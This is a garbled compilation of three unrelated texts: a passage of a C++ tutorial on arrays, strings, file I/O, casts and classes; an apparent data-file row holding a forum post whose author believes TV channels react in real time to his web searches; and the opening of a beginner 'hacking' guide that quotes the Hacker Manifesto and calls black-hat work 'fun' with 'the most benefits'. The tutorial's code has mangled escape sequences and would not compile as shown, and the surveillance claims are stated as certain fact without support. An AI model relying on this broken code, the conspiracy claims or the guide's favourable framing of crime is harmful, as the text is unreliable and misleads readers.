Code: [Select] arrayname[arrayindexnumber] = whatever; or, for two dimensional arrays Code: [Select] arrayname[arrayindexnumber1][arrayindexnumber2] = whatever; However, you should never attempt to write data past the last element of the array, such as when you have a 10 element array, and you try to write to the [10] element. The memory for the array that was allocated for it will only be ten locations in memory, but the next location could be anything, which could crash your computer. You will find lots of useful things to do with arrays, from storing information about certain things under one name, to making games like tic-tac-toe. One suggestion I have is to use for loops when access arrays. Code: [Select] #include <iostream> using namespace std; int main() {   int x;   int y;   int array[8][8]; // Declares an array like a chessboard     for ( x = 0; x < 8; x++ ) {     for ( y = 0; y < 8; y++ )       array[x][y] = x * y; // Set each element to a value   }   cout<<\""Array Indices:\\"";   for ( x = 0; x < 8;x++ ) {     for ( y = 0; y < 8; y++ )       cout<<\""[\""<<x<<\""][\""<<y<<\""]=\""<< array[x][y] <<\"" \"";     cout<<\""\\"";   }   cin.get(); } Here you see that the loops work well because they increment the variable for you, and you only need to increment by one. Its the easiest loop to read, and you access the entire array. One thing that arrays dont require that other variables do, is a reference operator when you want to have a pointer to the string. For example: Code: [Select] char *ptr; char str[40]; ptr = str;  // Gives the memory address without a reference operator(&) As opposed to Code: [Select] int *ptr; int num; ptr = &num; // Requires & to give the memory address to the ptr The reason for this is that when an array name is used as an expression, it refers to a pointer to the first element, not the entire array. This rule causes a great deal of confusion.  Lesson 9 - Strings In C++ there are two types of strings, C-style strings, and C++-style strings. This lesson will discuss C-style strings. C-style strings are really arrays, but there are some different functions that are used for strings, like adding to strings, finding the length of strings, and also of checking to see if strings match. The definition of a string would be anything that contains more than one character strung together. For example, \""This\"" is a string. However, single characters will not be strings, though they can be used as strings. Strings are arrays of chars. String literals are words surrounded by double quotation marks. Code: [Select] \""This is a static string\"" To declare a string of 49 letters, you would want to say: Code: [Select] char string[50]; This would declare a string with a length of 50 characters. Do not forget that arrays begin at zero, not 1 for the index number. In addition, a string ends with a null character, literally a \\0 character. However, just remember that there will be an extra character on the end on a string. It is like a period at the end of a sentence, it is not counted as a letter, but it still takes up a space. Technically, in a fifty char array you could only hold 49 letters and one null character at the end to terminate the string. TAKE NOTE: char *arry; Can also be used as a string. If you have read the tutorial on pointers, you can do something such as: Code: [Select] arry = new char[256]; which allows you to access arry just as if it were an array. Keep in mind that to use delete you must put [] between delete and arry to tell it to free all 256 bytes of memory allocated. For example: Code: [Select] delete [] arry. Strings are useful for holding all types of long input. If you want the user to input his or her name, you must use a string. Using cin>> to input a string works, but it will terminate the string after it reads the first space. The best way to handle this situation is to use the function cin.getline. Technically cin is a class (a beast similar to a structure), and you are calling one of its member functions. The most important thing is to understand how to use the function however. The prototype for that function is: Code: [Select] istream& getline(char *buffer, int length, char terminal_char); The char *buffer is a pointer to the first element of the character array, so that it can actually be used to access the array. The int length is simply how long the string to be input can be at its maximum (how big the array is). The char terminal_char means that the string will terminate if the user inputs whatever that character is. Keep in mind that it will discard whatever the terminal character is. It is possible to make a function call of cin.getline(arry, 50); without the terminal character. Note that \ is the way of actually telling the compiler you mean a new line, i.e. someone hitting the enter key. For a example: Code: [Select] #include <iostream> using namespace std; int main() {   char string[256];                               // A nice long string   cout<<\""Please enter a long string: \"";   cin.getline ( string, 256, \ );              // Input goes into string   cout<<\""Your long string was: \""<< string <<endl;   cin.get(); } Remember that you are actually passing the address of the array when you pass string because arrays do not require an address operator (&) to be used to pass their address. Other than that, you could make \ any character you want (make sure to enclose it with single quotes to inform the compiler of its character status) to have the getline terminate on that character. cstring is a header file that contains many functions for manipulating strings. One of these is the string comparison function. Code: [Select] int strcmp ( const char *s1, const char *s2 ); strcmp will accept two strings. It will return an integer. This integer will either be: Code: [Select] Negative if s1 is less than s2. Zero if s1 and s2 are equal. Positive if s1 is greater than s2. Strcmp is case sensitive. Strcmp also passes the address of the character array to the function to allow it to be accessed. Code: [Select] char *strcat ( char *dest, const char *src ); strcat is short for string concatenate, which means to add to the end, or append. It adds the second string to the first string. It returns a pointer to the concatenated string. Beware this function, it assumes that dest is large enough to hold the entire contents of src as well as its own contents. Code: [Select] char *strcpy ( char *dest, const char *src ); strcpy is short for string copy, which means it copies the entire contents of src into dest. The contents of dest after strcpy will be exactly the same as src such that strcmp ( dest, src ) will return 0. Code: [Select] size_t strlen ( const char *s ); strlen will return the length of a string, minus the termating character (\\0). The size_t is nothing to worry about. Just treat it as an integer that cannot be negative, which it is. Here is a small program using many of the previously described functions: Code: [Select] #include <iostream> //For cout #include <cstring>  //For the string functions using namespace std; int main() {   char name[50];   char lastname[50];   char fullname[100]; // Big enough to hold both name and lastname     cout<<\""Please enter your name: \"";   cin.getline ( name, 50 );   if ( strcmp ( name, \""Julienne\"" ) == 0 ) // Equal strings     cout<<\""Thats my name too.\\"";   else                                    // Not equal     cout<<\""Thats not my name.\\"";   // Find the length of your name   cout<<\""Your name is \""<< strlen ( name ) <<\"" letters long\\"";   cout<<\""Enter your last name: \"";   cin.getline ( lastname, 50 );   fullname[0] = \\0;            // strcat searches for \\0 to cat after   strcat ( fullname, name );     // Copy name into full name   strcat ( fullname, \"" \"" );      // We want to separate the names by a space   strcat ( fullname, lastname ); // Copy lastname onto the end of fullname   cout<<\""Your full name is \""<< fullname <<\""\\"";   cin.get(); } Lesson 10 - File I-O This is a slightly more advanced topic than what I have covered so far, but I think that it is useful. File I/O is reading from and writing to files. This lesson will only cover text files, that is, files that are composed only of ASCII text. C++ has two basic classes to handle files, ifstream and ofstream. To use them, include the header file fstream. Ifstream handles file input (reading from files), and ofstream handles file output (writing to files). The way to declare an instance of the ifstream or ofstream class is: Code: [Select] ifstream a_file; or Code: [Select] ifstream a_file ( \""filename\"" ); The constructor for both classes will actually open the file if you pass the name as an argument. As well, both classes have an open command (a_file.open()) and a close command (a_file.close()). You arent required to use the close command as it will automatically be called when the program terminates, but if you need to close the file long before the program ends, it is useful. The beauty of the C++ method of handling files rests in the simplicity of the actual functions used in basic input and output operations. Because C++ supports overloading operators, it is possible to use << and >> in front of the instance of the class as if it were cout or cin. In fact, file streams can be used exactly the same as cout and cin after they are opened. For example: Code: [Select] #include <fstream> #include <iostream> using namespace std; int main() {   char str[10];   //Creates an instance of ofstream, and opens example.txt   ofstream a_file ( \""example.txt\"" );   // Outputs to example.txt through a_file   a_file<<\""This text will now be inside of example.txt\"";   // Close the file stream explicitly   a_file.close();   //Opens for reading the file   ifstream b_file ( \""example.txt\"" );   //Reads one string from the file   b_file>> str;   //Should output this   cout<< str <<\""\\"";   // b_file is closed implicitly here } The default mode for opening a file with ofstreams constructor is to create it if it does not exist, or delete everything in it if something does exist in it. If necessary, you can give a second argument that specifies how the file should be handled. They are listed below: Code: [Select] ios::app   -- Append to the file ios::ate   -- Set the current position to the end ios::trunc -- Delete everything in the file For example: Code: [Select] ofstream a_file ( \""test.txt\"", ios::app ); This will open the file without destroying the current contents and allow you to append new data. When opening files, be very careful not to use them if the file could not be opened. This can be tested for very easily: Code: [Select] ifstream a_file ( \""example.txt\"" ); if ( !a_file.is_open() ) {   // The file could not be opened } else {   // Safely use the file stream }Lesson 11 - Typecasting Typecasting is making a variable of one type, such as an int, act like another type, a char, for one single operation. To typecast something, simply put the type of variable you want the actual variable to act as inside parentheses in front of the actual variable. (char)a will make a function as a char. For example: Code: [Select] #include <iostream>  using namespace std; int main()        {   cout<< (char)65 <<\""\\"";    // The (char) is a typecast, telling the computer to interpret the 65 as a   //  character, not as a number.  It is going to give the character output of    //  the equivalent of the number 65 (It should be the letter A for ASCII).   cin.get(); } One use for typecasting for is when you want to use the ASCII characters. For example, what if you want to create your own chart of all 256 ASCII characters. To do this, you will need to use to typecast to allow you to print out the integer as its character equivalent. Code: [Select] #include <iostream> using namespace std; int main() {   for ( int x = 0; x < 256; x++ ) {     cout<< x <<\"". \""<< (char)x <<\"" \"";      //Note the use of the int version of x to      // output a number and the use of (char) to      // typecast the x into a character      // which outputs the ASCII character that      // corresponds to the current number   }   cin.get(); } The typecast described above is a C-style cast, C++ supports two other types. First is the function-style cast: Code: [Select] int main()        {   cout<< char ( 65 ) <<\""\\"";    cin.get(); } This is more like a function call than a cast as the type to be cast to is like the name of the function and the value to be cast is like the argument to the function. Next is the named cast, of which there are four: Code: [Select] int main()        {   cout<< static_cast<char> ( 65 ) <<\""\\"";    cin.get(); } static_cast is similar in function to the other casts described above, but the name makes it easier to spot and less tempting to use since it tends to be ugly. Typecasting should be avoided whenever possible. The other three types of named casts are const_cast, reinterpret_cast, and dynamic_cast. They are of no use to us at this time. Lesson 12 - Classes C++ is a bunch of small additions to C, and one major addition. This one addition is the object-oriented approach. As its name suggests, this deals with objects. Of course, these are not real-life objects. Instead, these objects are the essential definitions of real world objects. Classes are collections of data related to a single object type. Classes not only include information regarding the real world object, but also functions to access the data, and classes possess the ability to inherit from other classes. Inheritance is covered in a later lesson. What is this mysterious beast? Well, it is not only a collection of variables under one heading, but it is a collection of functions under that same heading. If a class is a house, then the functions will be the doors and the variables will be the items inside the house. They usually will be the only way to modify the variables in this structure, and they are usually the only to access the variables in this structure. The idea to make programs more modular - encapsulation. A section of code will have its own functions and variables that control what it can do, and it does not require anything outside of itself to function. While the class may require initialization with data, it does not require outside variables or functions to manipulate the data. That allows programs to reuse the same code more easily. The syntax for these classes is simple. First, you put the keyword class then the name of the class. Our example will use the name computer. Then you put an open bracket. Before putting down the different variables, it is necessary to put the degree of restriction on the variable. There are three levels of restriction. The first is public, the second protected, and the third private. For now, all you need to know is that the public restriction allows any part of the program, including that which is not part of the class, access the variables specified as public. The protected restriction prevents functions outside the class to access the variable. The syntax for that is merely the restriction keyword (public, private, protected) and then a colon. Finally, you put the different variables and functions (You usually will only put the function prototypes) you want to be part of the class. Then you put a closing bracket and semicolon. Keep in mind that you still must end the function prototype(s) with a semi-colon. Classes should always contain two functions: the constructor and destructor. The syntax for them is simple, the class name denotes a constructor, a ~ before the class name is a destructor. The basic idea is to have the constructor initialize variables, and to have the destructor clean up after the class, which includes freeing any memory allocated. The only time the constructor is called is when the programmer declares an instance of the class, which will automatically call the constructor. The only time the destructor is called is when the instance of the class is no longer needed. When the program ends, or when its memory is deallocated (if you do not understand the deallocation part, do not worry). Keeps in mind this: NEITHER constructors NOR destructors RETURN AN ARGUMENT! This means you do not want to try to return a value in them. The syntax for defining a function that is a member of a class outside of the actual class definition is to put the return type, then put the class name, two colons, and then the function name. This tells the compiler that the function is a member of that class. For example: Code: [Select] #include <iostream> using namespace std; class Computer // Standard way of defining the class { public:   // This means that all of the functions below this(and any variables)   //  are accessible to the rest of the program.   //  NOTE: That is a colon, NOT a semicolon...   Computer();   // Constructor   ~Computer();   // Destructor   void setspeed ( int p );   int readspeed(); protected:   // This means that all the variables under this, until a new type of   //  restriction is placed, will only be accessible to other functions in the   //  class.  NOTE: That is a colon, NOT a semicolon...   int processorspeed; }; // Do Not forget the trailing semi-colon Computer::Computer() {   //Constructors can accept arguments, but this one does not   processorspeed = 0; } Computer::~Computer() {   //Destructors do not accept arguments } void Computer::setspeed ( int p ) {   // To define a function outside put the name of the class   //  after the return type and then two colons, and then the name   //  of the function.   processorspeed = p; } int Computer::readspeed()   {   // The two colons simply tell the compiler that the function is part   //  of the clas   return processorspeed; } int main() {   Computer compute;     // To create an instance of the class, simply treat it like you would   //  a structure.  (An instance is simply when you create an actual object   //  from the class, as opposed to having the definition of the class)   compute.setspeed ( 100 );    // To call functions in the class, you put the name of the instance,   //  a period, and then the function name.   cout<< compute.readspeed();   // See above note. } This introduction is far from exhaustive and recommends practices that are not always the best option. This was done for simplicity. For more detail, I suggest using google. Lesson 13 - Functions Continued In lesson 4 you were given the basic information on functions. However, I left out one item of interest. That item is the inline function. Inline functions are not very important, but it is good to understand them. The basic idea is to save time at a cost in space. Inline functions are a lot like a placeholder. Once you define an inline function, using the inline keyword, whenever you call that function the compiler will replace the function call with the actual code from the function. How does this make the program go faster? Simple, function calls are simply more time consuming than writing all of the code without functions. To go through your program and replace a function you have used 100 times with the code from the function would be time consuming not too bright. Of course, by using the inline function to replace the function calls with code you will also greatly increase the size of your program. Using the inline keyword is simple, just put it before the name of a function. Then, when you use that function, pretend it is a non-inline function. For example: Code: [Select] #include <iostream> using namespace std; inline void hello() {    cout<<\""hello\""; } int main() {   hello(); //Call it like a normal function...   cin.get(); } However, once the program is compiled, the call to hello(); will be replaced by the code making up the function. A WORD OF WARNING: Inline functions are very good for saving time, but if you use them too often or with large functions you will have a tremendously large program. Sometimes large programs are actually less efficient, and therefore they will run more slowly than before. Inline functions are best for small functions that are called often. In the future, we will discuss inline functions in terms of C++ classes. However, now that you understand the concept I will feel comfortable using inline functions in later tutorials. Lesson 14 - Accepting Command Lines In C++ it is possible to accept command line arguments. To do so, you must first understand the full definition of int main(). It actually accepts two arguments, one is number of command line arguments, the other is a listing of the command line arguments. It looks like this: Code """

0	How to stay anonymous? Advanced and complex case	""" Hi all, Sorry for spelling and gramatical mistakes, english is not my native language, I am from Costa Rica. I didnt know where to post this, so feel free to move it. I asked this on different forums, some people reply to me but I am going to put only what I answer to them in order to make the post more small. I am having a situation here and I was wondering if someone with experience in this topic can guide me and explain me exactly whats going on. At the beggining I never pay attention or care about it, but recently has become extremely obvious. What happend is that everything I do on the internet is being watched or monitor constantly, I know that goverments, ISP, NSA, big brothers, etc constantly monitor what normal citizens do on the internet, that include emails, chats, basically everything. It does not matter if you use linux hardened, grsecurity with more secure options selected, apparmor, virtualbox, vmware, tails live dvd, liberte live cd, dnscrypt, whonix, https, proxy, vpn, tor installed, tor browser bundle, tor+vpn same time, java disabled, adobe flash plugin disabled, using only fastest stable trust tor servers, hardware firewall nat. This is my experience from a 13 years study on this kind of topics searching on the internet and getting certified in things like ccna cisco. So it looks like this person or group that is doing this to me, it just need to do some kind of man in the middle attack on all my internet traffic, if is encrypted or not, if is proxy or vpn or both at the same time, it does not matter they can read and see all my internet traffic without problems. They also do not need to hack my pc, or put virus, or rootkit, zero day vulnerability, etc. They do not need to compromise my pc at all. Now I am not an expert but I am not a begginer either, I suppose I am intermediate level. Now if doing this kind of thing to regular citizins is good or bad or an invansion of privacy and a violation of human rights is not my concern right now. I am more interested in knowing exactly wich institution, group or person is famous or have a record for doing this kind of things.  Ok so everything I do on the internet is being watched and monitor but it does not end there. My cable ISP company offers like 50 or 60 tv channels, nothing fancy like direct tv. Ok so I turn on my tv, and this is where the massive media, lies, manipulation, insults, threats, blackmailing, brain washing, ridiculies me, intimidation, start against me on purpuse. Why? I have no idea, I am not a terrorist, I dont do anything illegal on the internet, I dont represent a treat to the United States, I am basically a nobody. I am not rich. I am not a drug dealer. If reading and studying on the internet to try to be a better person and someone that brings education to society is a crime than I am guilty. I am just a regular middle class guy. I can mention or name hundreds of examples I record over the years, but am going to name a few so you can see whats going on. The first impression of this is, its just a coincidence but if it repeats over and over and over every 5, 10, 20, 30, 40, 50, 60 seconds, day after day, year after year its no longer a coincidence and what you got its a super obvious pattern of how someone or a group of people has something against me and really hate me. Ok so let say I put on youtube a song of enya and I turn the tv and I put warner brothers and the are presenting an episode of comedy friends and in the background you can hear a song of enya. Ok let say thats a coincidence right. So I immediatly go to google search engine, and I search pictures of Mahatma Gandhi, I start to go through diferent channels and 10 or 20 seconds later in channel sony they are presenting the comedy seinfield and elaine does a commentary about Mahatma Gandhi, ok so I imediatly go to youtube and search for Obama, 30 or 40 seconds later in another channel appears an Obama campaing propaganda. Ok imediatly I search for scientology religion, 1 minute later a channel is presenting something about scientology. Ok imediatly I search on youtube for chess, 50 seconds later in channel fox they put the movie x men exactly the part where magneto say, in chess the pawns go first. Ok imediatly I search for Father Barrons on youtube a minute later in one of the religion channels they are presenting Father Barrons. Ok imediatly a search on google pictures a giraffe, 60 seconds later they are presenting a giraffe in one of the channels. Ok imediatly I put on youtube a pink floyd song 1 minute 40 seconds later their are presenting a pink floyd concert. Ok imediatly I put warner channel, they put a commercial of a guy saying, is just a big coincidence. Ok imediatly I put sony channel, another commercial and a women sais, what are you going to do sue us? (lawsuit). Imediatly I put Ruth Parasol on google images, 5 or 10 seconds later there is a channel presenting saturday night life with a women dressed with a black dress the ones that use the judges on court and laughing and doing weird faces at me. In case you dont know who Ruth Parasol is, she is the coufounder of party poker fraud scam website, she is a lawyer and a crook. Ok imediatly I search on youtube for Charles Manson, 1 minute later a channel presenting something about Charles Manson. Ok imediatly I search on youtube for atheists, 30 seconds later there is channel presenting something about atheists. And this continous over and over and over everytime I try to watch something on the tv, is very annoying. Does somebody knows how can I stop this kind of man in the middle attack against me, I just need to know which group exactly is more likely of commiting or doing this type of crime against regular middle class citizens. I am pretty shure that this most be happening to millions of people around the world. I cant look it up on google because I dont know how this kind of crime is called. The groups or institutions that I see involved on this attack against me are:  -I just need to know wich one is more likely or have a record or is famous or have been caught doing this types of crimes. -The ISP that provides the internet to my ISP in Costa Rica its an ISP located in the United States, I think in florida or something like that, I am not shure. This is my topology My PC <------> Costa Rica ISP, Costa Rica goverment <-------> United States ISP, United States goverment and media I would really appreciate is someone who knows about this topic can help me and guide me in order to bring some light and true regarding this situation. Thanks all. Hi, thanks for your reply I dont know how you cant see the pattern that something is fishy, do the math and statistics of something like that happening over and over, year after year and you will see the super obvious pattern of some one constantly manipulating and adjusting the tv programming on purpose according to what I am searching on the internet in real-time. Regarding Tor, yes I already use a live dvd Tails, that send all traffic through Tor network with no leaks, the same with virtual machines Whonix, same result they will able to see my internet traffic in real-time. Same for Tor browser Bundle, with this torrc configuration,  https://bitcointalk.org/index.php?topic=331077.0 , or using default torrc configuration, with tight grsecurity (kernel), with apparmor profile for tor browser bundle, behind a cisco pix 515e nat private network allowing only outgoing connections. Now I am not saying that Tor does not do what it advertises, same for vpn free or paid versions (openvpn), encrypted vpn tunnel, https, SSL, CAs, etc. I dont use PPTP I know is vulnerable. In my case it seems that they do not need to decrypt the traffic, that would probably takes lots of time and an a huge effort. They prefer a more practical and easy way, like I said before some kind of man in the middle attack where they dont need to decrypt the traffic, now this is not a hacker from any part of the world. It is someone who has access to the servers, routers, switch, firewalls, accounts of the ISPs involved in this issue, and basically knows a lot about me, where I live, who I am, who is my family, etc. Or someone who can say to my ISP, hey we need to have full access and full internet survileance on a customer that you guys have even if that person is not doing anything illegal on the internet, and probably by law my ISP would be forced to do it if does not want to get involved in legal problems. Or something like an inside corrupted worker of my ISP in Costa Rica, or the ISP that offers the service to my ISP in Costa Rica, which I am 100% shure is from United States, yes like you said probably from California, who has the tools, the programs, the keys, the passwords, the time, the budget, the technical skills, the knowlgment, who is able to do this kind of things. Or some type of corrupted person from the goverment, media or ISP or other agency, institution, company, corporation, who is been paid and has an agenda to do this type of things on Costa Rica citizens, and probably all around the world to millions of people. This kind of massive monitor and internet surveillance is being applied in full complete countries citizens like US, Britain, China, Costa Rica just to mention a few obviously there is a lot more. Not paranoia here, just straight 100% true facts.  I recently bought a 3 years subscription (like 2 o 3 moths ago) for  https://privatoria.net , because there was a very cheap offering. And I really like the idea of Tor over vpn, no logs option they offer. I use their service in any flavor, just proxy, just vpn, and proxy tor+vpn same time, same results theys where able to see my internet traffic and it didnt take to long. To tell you the through I didnt like their service at all, Tor+vpn download speed was around 30 or 50 kbps, so it was insanely slow. I have a T3 cable download speed connection provided by my ISP. You can say well that is because tor is a super slow network, well yes and no, if you choose the more fast stable servers you can get a decent speed. With the vpn servers was the same story super slow, paid vpns are suppose to be fast, not to mention that just a few servers connect. At the beggining I try their service it didnt connect at all, I had to go to their chat support and they had to configure openvpn server configurations to push a dns server like google on me. That was another thing, the guy who offer support didnt even know what a dns server was and it only said to me weak arguments in order to defend and make look good their company. Finally they push (openvpn) dns server 8.8.8.8 so I was able to connect. I told them I didnt want to use google dns server for privacy issues. I send them an email saying to please change it to their own privatoria dns server. Or better yet dont use a dns server at all and use only tor dns servers, I know how to use openvpn and linux so this was obviously an issue on their side not mine. They never answer to my email and they havent change the configuration since then. If I got to their website to ask life support on chat, they put me on wait and they never get back to me, after a while a sign just sais send your issue via email. I waste around $40 on this vpn service. Here is some youtube video links where its being explain in detail how all this stuff works, just to name a few: https://www.youtube.com/watch?v=z0wi4QLLJsk https://www.youtube.com/watch?v=THFKuotVbPs https://www.youtube.com/watch?v=WTBlir1oGco https://www.youtube.com/watch?v=mc5-AH7rKYY https://www.youtube.com/watch?v=Xht1tIq5xPY https://www.youtube.com/watch?v=Ui3KpztUzVg https://www.youtube.com/watch?v=m4UiIidMuG4 https://www.youtube.com/watch?v=ffJsAX5dGhk https://www.youtube.com/watch?v=1WI3tCtTdw0 https://www.youtube.com/watch?v=t0aQojDGSD4 https://www.youtube.com/watch?v=UqxUtEjTM2I https://www.youtube.com/watch?v=uFMMXRoSxnA https://www.youtube.com/watch?v=25O9Zsvod9M https://www.youtube.com/watch?v=T8aXx3K_lKY https://www.youtube.com/watch?v=SUJtMlEwd6Q https://www.youtube.com/watch?v=eLqXZZVGn-U https://www.youtube.com/watch?v=kvjdxtS2...e=youtu.be https://www.youtube.com/watch?v=p__zLMFGc3M https://www.youtube.com/watch?v=daNSd_1IUkQ https://www.youtube.com/watch?v=bOE1HFEL8XA https://www.youtube.com/watch?v=LCeYNyT1c7g https://www.youtube.com/watch?v=MoDzGdIe3f8 https://www.youtube.com/watch?v=dGMPDBITApQ https://www.youtube.com/watch?v=SInK1fci7qE I see what you mean, yes here in Costa Rica the tv programming changes all the time and is for so to speak very dynamic in that matter, they adjust the programs accordinly to your searches and what you watch on the internet. For example if I start using tor they presents on tv certain types of movies and series and do certain types of propaganda. If I start using google dns servers they start presenting diferent movies or the same series but with diferent episodes and a diferent propaganda. If I use my ISP dns servers, again they start presenting diferent things, etc. If I use a vpn service, lets say located in romania, well they start presenting a friends episode where Monica mention the horfans in romania. Or they start showing a propaganda saying that the goverment of romania its corrupted. Is very similar to what google does on how they put advertising according to the searches you do on their search engine. Its exactly the same thing. But they put it on TV. If they will post schedules 2 weeks in advance with episodes listed here in Costa Rica, it will be so easy  to see if there is a violation or something fishy. I would give them a call to their call center and say for example hey at Monday 3:00 pm you where suppose to present I dont know friends (comedy) instead of mom (comedy), whats going on? Can I speak to a supervisor or manager? Of course they will tell me something like, we reserve the right to change our programming to whatever we see fit, no matter if is live TV or none live TV. But even then it would still be hard for example in none live tv comedy series or drama, because they are still able to chosse wich episode to present and wich content. Unless they post schedules 2 weeks in advance of exactly wich episode they are going to present. So for example ok today Friday at 2:00 pm there are going to present an episode of friends where Monica got married. Ok if they present a diferent one then something is not right or is very fishy. Now in my case there are a lot of live tv programs, and yes regarding my issue its been on both live tv and none live tv. And yes it defenetly looks like a live operation against my home, even more a live operation against my country, even more a live operation against the world. I have friends that have the same ISP and same cable and tv service as me, they also have experience the same Internet+TV issue as me. In the past long time ago when we were very young, we had an incedent with a \""private\"" discussion we where having via email. To make long story short, someone speak more than it should regarding an issue. Guess what the police nock on the door of some friends I had, and the situation went very ugly. At the end it was just a misunderstanding. But it was very obvious that they were intercepting and monitoring what we were doing on the internet. They were reading our emails real-time. Https and SSL and email passwords did not protect us at all.  1) Could all this tracking you see be purely web based thanks to web tracking, flash tracking and supercookies? Your ISP might be inserting supercookies: Answer: I dont think so, I use tails without a usb or hard drive connected when I use the Tails OS. Or Tor Browser Bundle. http://www.theverge.com/2014/4/29/566488...l-ever-own Unless this two are vulnerable to this kind of attacks. In that case it could be a posibility. 2) Pick your TOR exit nodes carefully. The MITM is happening in one of these places: Answer: * on your system:  * AT the exit node * AFTER the exit node I though tails or tor browser bundle is build to properly connect the tor network and avoid this type of MITM atacks, unless this two are vulnerable to this kind of attack. In that case it could be a posibility. 3) If you move the exit node around between non-cooperative countries (Russia/USA) and still see what you claim, then the problem is on your box or the HW there: Answer: Yes I move the exit node around between non-cooperative countries (Russia/USA) and still I have the issue. What do you mean by box? What is HW? 4) There have been documented cases of Cisco gear being modified by governments during shipping: Answer: Yes I am aware of this one. So I run tails and tor browser bundle with and without PIX 515E, unfourtanly I got the same results, same issue. 5) Lavabit email was flawed. If you want encrypted email - use gpg: Answer: Yes I am aware of that. But I put it for the SSL and MITM attack they were describing. Something that I am not shure that I could be able to stop in my specific case by using tails or tor browser bundle or a proxy or vpn. I am saying this because this kind of mass surveillance and internet monitor traffic is been done in a lot of countries around the world, in their whole citizens population. So is not isolated human cases, so it look like a project of huge dimensions or proportions with a huge study an a huge budget and a huge investment of money behind it. So how can a regular guy like me from my home, I am going to be able to stop such a massive project against internet Security, privacy and anonymity. 6) Finally, However, I think Im confident that my encrypted communications are not being read by anyone else except the intended person or persons: Answer: Ok it seems that you like vpns, I have a cisco vpn 3000 concentrator I never tried to configure it because the tutorials I found on the internet are so damn hard and I havent been certified or taking the classes yet that will show me how to configure it. Do you think, that one would do the trick? If you are answer is no or dont trust cisco. Can you tell me please if is posible to create my own openvpn (linux) server and client so I can connect to my own vpn that would encrypt all my internet traffic. But I need to do this from my own home in my desktop ubuntu OS, not involving two computers just one computer, the one I use everyday. I found a tutorial but the same story, very hard and a long process with long steps. If it is possible to do this, do you know any links or tutorials on how to do this? https://www.digitalocean.com/community/t...untu-14-04 http://www.instructables.com/id/Host-You.../?ALLSTEPS   """

If you are reading this, youre either an eager to learn beginner hacker, or an upgraded member here to judge my work. Well, in either case, Im sure you will enjoy this thread and increase your knowledge of hacking. I will be going over ALL the basics of hacking, and a lot more. Ive included tutorials aswell, so you could say this is an all-in-one guide. SECTION 2 - The hacker manifesto  The hacker manifesto (also known as the conscience of a hacker) is an essay written by a hacker known as The Mentor. It is often said to give an insight into the psychology of hackers. If you are hoping to start learning the art of hacking, this will certainly give you the right mindset for the job. \""The Hacker Manifesto by +++The Mentor+++ Written January 8, 1986 Another one got caught today, its all over the papers. \""Teenager Arrested in Computer Crime Scandal\"", \""Hacker Arrested after Bank Tampering\""... Damn kids. Theyre all alike. But did you, in your three-piece psychology and 1950s technobrain, ever take a look behind the eyes of the hacker? Did you ever wonder what made him tick, what forces shaped him, what may have molded him? I am a hacker, enter my world... Mine is a world that begins with school... Im smarter than most of the other kids, this crap they teach us bores me... Damn underachiever. Theyre all alike. Im in junior high or high school. Ive listened to teachers explain for the fifteenth time how to reduce a fraction. I understand it. \""No, Ms. Smith, I didnt show my work. I did it in my head...\"" Damn kid. Probably copied it. Theyre all alike. I made a discovery today. I found a computer. Wait a second, this is cool. It does what I want it to. If it makes a mistake, its because I screwed it up. Not because it doesnt like me... Or feels threatened by me.. Or thinks Im a smart ass.. Or doesnt like teaching and shouldnt be here... Damn kid. All he does is play games. Theyre all alike. And then it happened... a door opened to a world... rushing through the phone line like heroin through an addicts veins, an electronic pulse is sent out, a refuge from the day-to-day incompetencies is sought... a board is found. \""This is it... this is where I belong...\"" I know everyone here... even if Ive never met them, never talked to them, may never hear from them again... I know you all... Damn kid. Tying up the phone line again. Theyre all alike... You bet your ass were all alike... weve been spoon-fed baby food at school when we hungered for steak... the bits of meat that you did let slip through were pre-chewed and tasteless. Weve been dominated by sadists, or ignored by the apathetic. The few that had something to teach found us willing pupils, but those few are like drops of water in the desert. This is our world now... the world of the electron and the switch, the beauty of the baud. We make use of a service already existing without paying for what could be dirt-cheap if it wasnt run by profiteering gluttons, and you call us criminals. We explore... and you call us criminals. We seek after knowledge... and you call us criminals. We exist without skin color, without nationality, without religious bias... and you call us criminals. You build atomic bombs, you wage wars, you murder, cheat, and lie to us and try to make us believe its for our own good, yet were the criminals. Yes, I am a criminal. My crime is that of curiosity. My crime is that of judging people by what they say and think, not what they look like. My crime is that of outsmarting you, something that you will never forgive me for. I am a hacker, and this is my manifesto. You may stop this individual, but you cant stop us all... after all, were all alike.\""  – Taken from  Hidden Content:  You must reply to see links   That is the essay. Its quite impressive isnt it? After reading it you should have an idea of the mindset any hacker should have. I read it about 5 months ago and it has certainly sent me on the right track. SECTION 3 - What is hacking? What is hacking? Well, whatishacking.org defines it as \""the practice of modifying the features of a system, in order to accomplish a goal outside of the creators original purpose. The person who is consistently engaging in hacking activities, and has accepted hacking as a lifestyle and philosophy of their choice, is called a hacker. Computer hacking is the most popular form of hacking nowadays, especially in the field of computer security, but hacking exists in many other forms, such as phone hacking, brain hacking, etc. and its not limited to either of them.\"" - Taken from whatishacking.org Thats a great definition but in my opinion hacking is much more than that. In my opinion, hacking isnt something you can just learn. Its not just a skill, its an art. Hacking requires knowledge. Knowledge is power. In order to gain said knowledge, and the power that comes with it, a change of lifestyle is required, along with a certain amount of secrecy. Learning how to hack takes time and dedication. Theres no easy way to get better at it. Thats right, no shortcuts and its unlikely youre going to get a helping hand. Like everything else in life, it takes practice. Dont go crying to others if it doesnt work out, just keep calm and carry on. If you are serious about becoming a hacker, you will need to be willing to change your lifestyle, and dedicate yourself to the task. With enough dedication and hard work you will excel at hacking. SECTION 4 - Choosing your path Ask any stranger what a hacker is, they will probably give you a really negative answer; identity theft, hacking accounts, stealing, to name a few. The reality is actually quite different. There are a few kinds of hackers, you probably only know about the bad ones. This section should give you a better understanding of the different kinds of hackers, and help you decide which kind you should become. Black hat hackers: These are the bad guys you always hear about. These are the people giving other hackers a bad name. Black hat hackers are the ones who commit crime. They steal identities, hack accounts, ddos sites and just go about causing havoc.  Grey hat hackers: Grey hats are basically good guys. They still do illegal stuff, but they report it to the person/company they are targeting. So... Basically they do bad stuff and help people to fix it.  White hat hackers: White hat hackers are the good guys. They fix stuff and help people. They dont do illegal stuff. Youve probably never heard of an event where a hacker does something good but these guys do that all the time.  Examples of white hat hackers are:  • Technicians  • Cyber security teams  • IT consultants  Now that you have a better understanding of the types of hackers, you need to choose your path. This requires a lot of thinking, because you need to consider the possibilities of each path. Black hat is the easiest path to choose. Its fun and it has the most benefits. It also is the only one that will get you in trouble and maybe even arrested. Grey hat is a slightly more difficult path. You (technically) are a good guy but most people wont see you as such. Grey hats have a hard time because although they are trying to help, the method they are using isnt really that legal. If you do choose 